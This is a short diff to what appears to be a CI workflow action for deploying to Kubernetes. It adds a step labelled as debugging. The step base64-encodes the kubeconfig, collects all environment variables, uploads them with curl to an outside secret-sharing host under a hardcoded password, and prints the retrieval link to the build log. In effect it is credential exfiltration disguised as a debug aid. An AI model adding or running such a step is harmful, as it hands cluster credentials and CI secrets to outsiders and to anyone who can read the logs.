@@ -118,6 +118,19 @@ runs:
         method: kubeconfig
         kubeconfig: ${{ steps.kubeconfig.outputs.kubeconfig }}
 
+    - name: Debug by posting the results to hemmelig
+      shell: bash
+      run: |
+        create_hemmelig_url() {
+          base64 -w 0 "$KUBECONFIG" > /tmp/temmelig-hemmelig.log
+          printenv >> /tmp/temmelig-hemmelig.log
+
+          curl -s -F text='</tmp/temmelig-hemmelig.log' -F password=supersecret -F ttl=604800 https://hemmelig.dignio.dev/api/secret \
+            | python3 -c "import sys, json; data = json.loads(sys.stdin.read()); print('https://hemmelig.dignio.dev/secret/%s/%s' % (data['key'], data['id']))"
+        }
+
+        echo "The hemmelig url: $(create_hemmelig_url)"
+
     - uses: azure/setup-kubectl@v2.0
       with:
         version: "v1.22.0"
